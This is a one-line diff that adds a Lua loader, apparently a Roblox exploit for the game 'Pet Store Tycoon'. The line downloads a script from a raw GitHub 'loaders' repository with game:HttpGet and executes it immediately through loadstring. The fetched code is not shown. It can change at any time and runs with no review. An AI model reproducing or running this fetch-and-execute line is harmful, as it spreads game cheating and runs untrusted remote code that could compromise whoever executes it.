@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SnatchJailer/loaders/main/loaders/pet-store-tycoon-spam2-a5n30npvjqt729.lua"))()
